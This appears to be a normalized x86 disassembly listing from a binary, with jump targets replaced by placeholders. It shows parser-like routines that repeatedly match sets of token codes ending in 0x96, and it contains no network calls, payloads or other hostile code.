pop esi
pop edi
mov [ edx ] 0x5
pop ebx
pop ebp
retn
push 0x5
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_10073b80
mov edx [ edi + 0xc ]
mov [ edx ] 0x5
mov eax [ edi + 0xc ]
mov [ eax + 0x34 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x0
mov eax edi
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov eax edi
call sub_100736d0
add esp 0x4
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
sub_10075c00
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x5
ja r-xdata
push esi
push edi
call sub_10021f70
add esp 0x8
pop edi
pop esi
pop ebp
retn
push ebx
jmp [ eax * 4 + jump_table_10075ce8 ]
xor ebx ebx
cmp [ esi + 0x14 ] ebx
jbe r-xdata
xor ebx ebx
cmp [ esi + 0x50 ] ebx
jbe r-xdata
mov eax [ esi + 0x10 ]
push eax
mov edx [ esi + 0x10 ]
push edx
push edi
call sub_10021f70
mov eax [ esi + 0x20 ]
push eax
push edi
call sub_10021f70
mov ecx [ esi + 0x24 ]
push ecx
push edi
call sub_10021f70
mov edx [ esi + 0x28 ]
push edx
push edi
call sub_10021f70
add esp 0x20
pop ebx
push esi
push edi
call sub_10021f70
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_10075c00
inc ebx
add esp 0x8
cmp ebx [ esi + 0x14 ]
jb r-xdata
mov edx [ esi + 0x4c ]
push edx
push edi
call sub_10021f70
xor ebx ebx
add esp 0x8
cmp [ esi + 0x14 ] ebx
jbe r-xdata
lea esp [ esp ]
mov edx [ esi + 0x10 ]
push edx
jmp r-xdata
lea ebx [ ebx ]
mov eax [ esi + 0x4c ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_10055ac0
inc ebx
add esp 0x8
cmp ebx [ esi + 0x50 ]
jb r-xdata
push edi
call sub_10021f70
add esp 0x8
pop ebx
mov eax [ esi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_10075c00
inc ebx
add esp 0x8
cmp ebx [ esi + 0x14 ]
jb r-xdata
sub_10075d00
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0xc ]
mov [ ebp - 0x4 ] edi
cmp eax 0x6
je r-xdata
push esi
mov eax ebx
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
cmp eax 0x4
jne r-xdata
cmp eax 0x5
jne r-xdata
push esi
call sub_10074310
add esp 0x4
mov edi ebx
mov eax esi
call sub_10074130
cmp eax 0x3
jne r-xdata
push esi
call sub_10074310
mov edi ebx
mov eax esi
call sub_10074130
push r--data
call sub_10020200
mov edx [ esi + 0xc ]
add esp 0x8
pop edi
pop esi
mov [ edx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov eax ebx
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_10073c60
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
push 0x96
push 0x2
push 0x6
push 0x7
push 0x82
push 0x5
push 0x4
push 0x7b
push 0x7e
push 0x8b
push 0x3
push 0x1
mov eax ebx
call sub_10073790
add esp 0x30
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] eax
sete al
test eax eax
je r-xdata
mov edx [ ebx ]
cmp edx 0x1
jne r-xdata
push ebx
push esi
call sub_100759d0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_100736d0
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
push esi
mov edi ebx
call sub_10074d80
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp edx 0x7
jne r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0xa
sete cl
test ecx ecx
je r-xdata
push 0x96
push 0x0
push 0xa
push 0x0
mov eax ebx
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
mov [ ebp + 0x8 ] 0x0
jbe r-xdata
xor ecx ecx
cmp eax 0x81
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_100736d0
add esp 0x4
cmp [ edi + 0xc ] 0x2
jb r-xdata
push 0x96
push 0x1e
push 0x79
push 0xc
push 0x19
push 0x1d
push 0xd
push 0x7a
push 0x15
push 0x16
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x8e
push 0x1c
push 0xe
push 0xb
push 0x18
push 0x1
mov eax ebx
call sub_10073790
add esp 0x60
test eax eax
je r-xdata
push esi
mov eax 0xa
call sub_10074610
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
mov edi [ eax + 0x8 ]
push esi
mov eax ebx
call sub_100736d0
add esp 0x4
cmp [ edi + 0xc ] 0x2
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx + 0x4 ]
push 0xa
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x1
mov eax ebx
call sub_10073790
add esp 0x20
test eax eax
je r-xdata
push ebx
call sub_10074c70
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_10073f90
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi + 0xc ] 0x0
mov [ ebp + 0xc ] 0x1
mov [ ebp + 0x8 ] 0x0
jbe r-xdata
push esi
mov eax ebx
call sub_100736d0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
inc eax
add edi 0x4
mov [ ebp + 0x8 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_10048ae0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx edi
mov edx [ ebx + 0x8 ]
mov edi [ edx + 0x4 ]
push 0xa
mov eax edi
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
mov edx edi
mov [ edx + 0x3c ] 0x0
mov eax [ ecx + 0x4 ]
push esi
mov edi ebx
call sub_10074d80
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x84
push 0x1b
push 0x1
mov eax ebx
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
push ebx
call sub_10074c70
add esp 0x4
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
mov [ ebp + 0x8 ] eax
push 0x10
push 0xf
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x20
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov [ edx ] 0x12
cmp [ ebx ] 0x2
jne r-xdata
mov edx edi
mov edi [ edx + 0x8 ]
mov edi edi
push 0x96
push 0x0
mov ecx [ edi ]
push 0xa
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x19
push 0x1f
push 0x21
push 0x22
push ecx
call sub_100737e0
add esp 0x38
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
push ebx
call sub_10074c70
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_10073f90
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0x40 ] 0x1
mov [ eax + 0x3c ] 0x0
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
mov ebx esi
call sub_10073f90
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_100736d0
add esp 0x4
mov eax esi
call sub_10073b80
mov ecx [ edi + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov eax [ edi + 0x68 ]
add ecx 0x10
call sub_10073b40
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp [ ebx + 0x18 ] eax
sete al
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_100736d0
mov edi [ ebp - 0x4 ]
add esp 0x4
mov [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
inc eax
add edi 0x4
mov [ ebp + 0x8 ] eax
cmp eax [ ecx + 0xc ]
jb r-xdata
lea esp [ esp ]
push 0x96
push 0x21
push 0x22
push 0x1
mov eax ebx
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x69
sete cl
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
pop edi
pop esi
mov [ eax + 0x34 ] 0x1
mov eax [ ebp + 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x0
push 0xa
push 0x66
push 0x64
push 0x68
mov eax [ edi ]
push 0x65
push 0x67
push 0x63
push 0x3d
push 0x3e
push 0x19
push 0x72
push 0x71
push 0x1f
push 0x21
push 0x22
push eax
call sub_100737e0
add esp 0x48
test eax eax
je r-xdata
mov edi ecx
jmp r-xdata
mov eax esi
call sub_10073b80
mov ecx [ ebx + 0x8 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov ebx esi
call sub_10074420
mov edx [ ebx + 0x4 ]
mov ecx [ edx + 0x4 ]
mov edx [ ecx + 0x14 ]
add ecx 0x10
xor eax eax
test edx edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
push 0x0
jmp r-xdata
xor edx edx
cmp eax 0x1f
sete dl
mov eax edx
test eax eax
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
push edi
push ebx
call sub_10075c00
mov edi [ ebp + 0xc ]
add esp 0x8
call sub_10073f90
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0x13
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ecx ]
lea ebx [ ebx ]
push 0x96
push 0x1e
push 0x79
push 0xc
push 0x1b
push 0x1d
push 0xd
push 0x7a
push 0x84
push 0x15
push 0x16
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x8e
push 0x6e
push 0x1c
push 0xe
push 0xb
push 0x18
push 0x0
mov eax ebx
call sub_10073790
add esp 0x68
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x88
sete cl
test ecx ecx
je r-xdata
push ebx
push esi
call sub_10074cf0
push ebx
call sub_10074c70
mov edi ebx
add esp 0x10
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_10073f90
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push ebx
call sub_10074c70
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_10073f90
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov [ ecx + 0x30 ] eax
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
push r--data
call sub_10020200
push esi
mov eax ebx
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ecx
push eax
push ebx
call sub_1005c190
add esp 0xc
inc eax
add esi 0x4
cmp eax edx
jb r-xdata
cmp [ ebx ] 0x2
jne r-xdata
mov eax [ ebx + 0x18 ]
push esi
call sub_10074610
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x6e
sete cl
mov eax ecx
test eax eax
je r-xdata
push ebx
call sub_10074c70
mov edi ebx
mov ebx esi
mov [ ebp + 0xc ] eax
call sub_10073f90
mov eax ebx
push 0x6
push eax
call sub_10067ca0
mov eax [ ebp + 0xc ]
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi ] edi
je r-xdata
jmp r-xdata
push 0x96
push 0x21
push 0x22
push 0x0
mov eax ebx
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x69
sete cl
test ecx ecx
je r-xdata
mov eax [ ebx + 0x18 ]
push ebx
mov ecx esi
call sub_10074bf0
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax 0x6e
call sub_10074610
add esp 0x4
push esi
test eax eax
je r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x0
mov eax ebx
call sub_10073790
add esp 0x20
test eax eax
je r-xdata
mov edi [ ebx + 0x18 ]
push esi
mov eax edi
call sub_10074610
add esp 0x4
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x19
sete cl
test ecx ecx
je r-xdata
mov eax [ edi + 0x30 ]
mov [ ebp - 0x10 ] 0x1
mov [ edi + 0x30 ] 0x0
test eax eax
je r-xdata
call sub_10074310
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f90
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ edx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_100736d0
push ebx
mov eax 0x6e
mov ecx esi
call sub_10074bf0
add esp 0x8
mov [ edi + 0x34 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x1
jne r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push esi
call sub_100746e0
add esp 0x20
test eax eax
je r-xdata
push ebx
mov eax edi
mov ecx esi
call sub_10074bf0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_100736d0
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_10048ae0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax 0x1f
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
mov eax 0x19
call sub_100747d0
add esp 0x4
test eax eax
jne r-xdata
push r--data
call sub_10020200
push esi
mov eax ebx
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax esi
call sub_10074670
test eax eax
je r-xdata
push 0x96
push 0x3a
push 0x94
push 0x29
push 0x8a
push 0x2a
push 0x2b
push 0x38
push 0x8f
push 0x28
push 0x32
push 0x8c
push 0x39
push 0x1
mov eax ebx
call sub_10073790
add esp 0x38
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x27
sete al
test eax eax
je r-xdata
mov edi 0x96
call sub_100748b0
mov edx [ ebx + 0x18 ]
push edx
mov eax esi
call sub_100734d0
call sub_10073830
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
mov eax 0x1f
call sub_10074770
add esp 0x4
test eax eax
je r-xdata
push ebx
mov eax 0x19
mov ecx esi
call sub_10074bf0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_100736d0
push esi
call sub_10074310
push 0x19
mov eax 0x10
mov ecx esi
call sub_10073fd0
add esp 0xc
mov [ edi + 0x34 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0xc ]
mov edi 0x96
call sub_100748b0
mov eax esi
call sub_100734d0
cmp eax ebx
je r-xdata
mov edi [ ebx ]
cmp edi 0x1
jne r-xdata
push esi
call sub_10074310
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f90
mov ebx eax
mov edi esi
call sub_100742a0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp + 0xc ]
push eax
mov eax esi
mov [ ebp - 0x4 ] 0x1
call sub_100741f0
add esp 0x4
test eax eax
je r-xdata
mov eax esi
call sub_10073b80
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push eax
call sub_100737e0
add esp 0x20
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_100736d0
add esp 0x4
push ebx
mov eax 0x1f
mov ecx esi
call sub_10074bf0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
push esi
call sub_100736d0
add esp 0x4
xor edi edi
jmp r-xdata
push 0x96
push 0x3a
push 0x94
push 0x29
push 0x8a
push 0x2a
push 0x2b
push 0x92
push 0x38
push 0x8f
push 0x28
push 0x32
push 0x8c
push 0x39
push 0x27
push 0x0
mov eax ebx
call sub_10073790
add esp 0x40
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x92
sete al
test eax eax
je r-xdata
push esi
call sub_10074310
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f90
mov ebx eax
mov edi esi
call sub_100742a0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_100736d0
push 0x27
push ebx
push esi
call sub_10075120
lea ecx [ ebp + 0xc ]
push ecx
mov eax esi
call sub_100741f0
add esp 0x14
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edx
push eax
push esi
call sub_1005c190
add esp 0xc
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edx ]
lea ecx [ ecx + eax * 4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
add edx 0x8
dec eax
js r-xdata
push 0x96
push 0x4a
push 0x90
push 0x7c
push 0x1
mov eax ebx
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebx + 0x18 ]
push ecx
push ebx
push esi
call sub_10075120
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov [ ebp + 0xc ] edi
call sub_10074310
push esi
mov eax 0x92
call sub_10074610
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
lea edx [ edi + 0x14 ]
push edx
push eax
push esi
call sub_1005c190
add edi 0x8
push edi
push eax
push esi
call sub_10021d60
add esp 0x18
sub ecx 0x4
dec eax
jns r-xdata
push 0x96
push 0x4a
push 0x90
push 0x7c
push 0x0
mov eax ebx
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
push esi
call sub_10074310
mov edi ebx
mov ebx esi
call sub_10073f90
mov ebx r--data
mov edi esi
call sub_100742a0
push edi
call sub_100733d0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
mov ebx esi
call sub_10073f90
mov edi ebx
mov eax edi
call sub_100734d0
mov ebx eax
call sub_100742a0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
mov [ ebp + 0xc ] 0x0
call sub_100736d0
push 0x92
push ebx
push esi
call sub_10075120
push esi
call sub_10074310
add esp 0x14
cmp [ ecx ] ebx
je r-xdata
cmp edi 0x1
jne r-xdata
mov edi [ ebx + 0x18 ]
push esi
mov eax edi
call sub_10074830
add esp 0x4
test eax eax
je r-xdata
push 0x96
push 0x43
push 0x74
push 0x46
push 0x47
push 0x49
push 0x42
push 0x52
push 0x1
mov eax ebx
call sub_10073790
add esp 0x24
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x5f
sete al
test eax eax
je r-xdata
push ebx
mov eax edi
mov ecx esi
call sub_10074bf0
add esp 0x4
mov ebx esi
call sub_10074420
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0x1
cmp edi 0x1
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
cmp [ edx + 0x2c ] edi
je r-xdata
push 0x96
push 0x4f
push 0x4e
push 0x4b
push 0x1
mov eax ebx
call sub_10073790
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x6d
sete al
test eax eax
je r-xdata
push esi
call sub_10074310
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f90
mov esi eax
mov eax edi
cmp [ eax ] 0x1
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x46
sete al
test eax eax
je r-xdata
mov edi ebx
mov ebx esi
call sub_10073f90
push esi
call sub_100733d0
mov eax [ esi + 0xc ]
add esp 0x4
pop edi
pop esi
mov [ eax ] 0x8
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_10074c70
add esp 0x4
cmp edi 0x1
jne r-xdata
mov edi ebx
mov ebx esi
call sub_10073f90
mov eax esi
call sub_10073b80
mov ecx [ esi + 0xc ]
pop edi
mov eax 0x1
pop esi
mov [ ecx + 0x38 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ ebx + 0x1c ]
mov eax r--data
call sub_10073320
add esp 0x4
test eax eax
jne r-xdata
mov edi ebx
mov ebx [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x18 ] 0x46
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
mov [ ebp - 0x4 ] 0x0
call sub_100736d0
add esp 0x4
mov [ ebx + 0x18 ] 0x47
push 0x96
push 0x71
push 0x72
push 0x1
mov eax ebx
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x1a
sete cl
test ecx ecx
je r-xdata
push esi
call sub_10074310
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f90
mov eax esi
call sub_10073b80
mov edx [ esi + 0xc ]
pop edi
mov eax 0x1
pop esi
mov [ edx + 0x38 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_100733d0
add esp 0x4
mov edi [ ebp + 0x8 ]
push edi
xor ebx ebx
call sub_100736d0
add esp 0x4
or [ esi + 0xc ] 0x40
mov [ esi + 0x1c ] 0x47
jmp r-xdata
push 0x96
push 0x3d
push 0x3e
push 0x1
mov eax ebx
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
push 0x72
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x83
sete cl
test ecx ecx
je r-xdata
push ebx
call sub_10074c70
mov edi ebx
mov ebx esi
mov [ ebp + 0xc ] eax
call sub_10073f90
mov eax esi
call sub_10073b80
mov edx [ esi + 0xc ]
push esi
mov [ edx + 0x38 ] 0x1
call sub_100733d0
mov eax [ ebp + 0xc ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073b80
mov ecx [ edi + 0xc ]
push edi
mov [ ecx + 0x38 ] 0x1
call sub_100733d0
add esp 0x4
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x2
jne r-xdata
push esi
mov eax 0x3c
mov [ ebp + 0x8 ] 0x1
call sub_10074610
add esp 0x4
test eax eax
je r-xdata
push esi
call sub_10074310
mov edi ebx
add esp 0x4
mov ebx esi
call sub_10073f90
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10073b80
xor ecx ecx
cmp eax 0x73
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_100736d0
mov eax [ esi + 0xc ]
add esp 0x4
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x42
sete al
test eax eax
je r-xdata
push 0x3c
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
mov edi 0x96
call sub_100748b0
xor ecx ecx
cmp eax 0x85
sete cl
test ecx ecx
je r-xdata
push 0x2
mov eax ebx
call sub_10074190
mov eax [ esi + 0xc ]
push esi
mov [ eax + 0x40 ] 0x1
call sub_100733d0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov [ eax + 0x38 ] 0x1
call sub_10074c70
push esi
call sub_100733d0
lea edi [ ebx + 0x1c ]
push r--data
push edi
mov [ ebp - 0x10 ] edi
call sub_10070600
push r--data
push edi
mov [ ebp + 0x8 ] eax
call sub_10070600
push r--data
push edi
mov [ ebp + 0xc ] eax
call sub_10070600
mov [ ebp - 0xc ] eax
push 0x69
mov eax 0x20
mov ecx esi
call sub_10073fd0
add esp 0x24
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x1
push 0x80
push 0x61
push 0x62
push 0x60
push 0x1
mov eax ebx
call sub_10073790
add esp 0x34
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x53
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_100736d0
push esi
call sub_10074310
push 0x42
lea eax [ edi + 0xe ]
mov ecx esi
call sub_10073fd0
add esp 0xc
mov eax esi
call sub_10073b80
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_100736d0
add esp 0x4
jmp r-xdata
xor ecx ecx
cmp eax 0x48
sete cl
test ecx ecx
je r-xdata
push ebx
call sub_10074c70
push esi
mov edi eax
call sub_10074310
push esi
call sub_100733d0
push 0x4
mov eax ebx
call sub_10074190
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1a
mov eax 0x20
mov ecx esi
call sub_10073fd0
mov eax esi
call sub_10073b80
push 0x6c
mov eax 0x20
mov ecx esi
call sub_10073fd0
mov edi [ esi + 0xc ]
mov edx [ ebx + 0x10 ]
add edi 0x48
mov [ edi + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ edi + 0x10 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0x14 ] ecx
mov edx [ ebx + 0xc ]
add esp 0x8
cmp [ ebp + 0x8 ] 0x0
mov [ edi + 0x18 ] edx
mov [ edi + 0x1c ] 0x2
je r-xdata
mov ecx [ ebp + 0xc ]
add eax 0x4c
push eax
push ecx
push esi
call sub_10046530
add esp 0xc
cmp edi 0x1
je r-xdata
xor ecx ecx
cmp eax 0x5c
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
call sub_10074310
mov eax ebx
mov edi esi
call sub_10074eb0
push esi
mov eax ebx
call sub_10074df0
push esi
mov eax 0x2
call sub_10074020
add esp 0xc
mov [ ebp + 0x8 ] 0x0
xor ecx ecx
cmp eax 0x87
sete cl
test ecx ecx
je r-xdata
push esi
call sub_100733d0
push 0x4
mov eax ebx
call sub_10074190
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea ecx [ ebp - 0x8 ]
push ecx
push esi
mov [ ebp - 0x8 ] r--data
mov [ ebp - 0x4 ] 0x33
call sub_10067d90
add esp 0xc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ecx + 0xc ]
dec edi
mov eax [ ebx + 0x18 ]
mov [ ebp + 0x8 ] eax
js r-xdata
push esi
call sub_10074310
push esi
mov eax ebx
call sub_10074e50
push esi
mov eax ebx
call sub_10074df0
push esi
mov eax 0x1
call sub_10074020
add esp 0x10
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
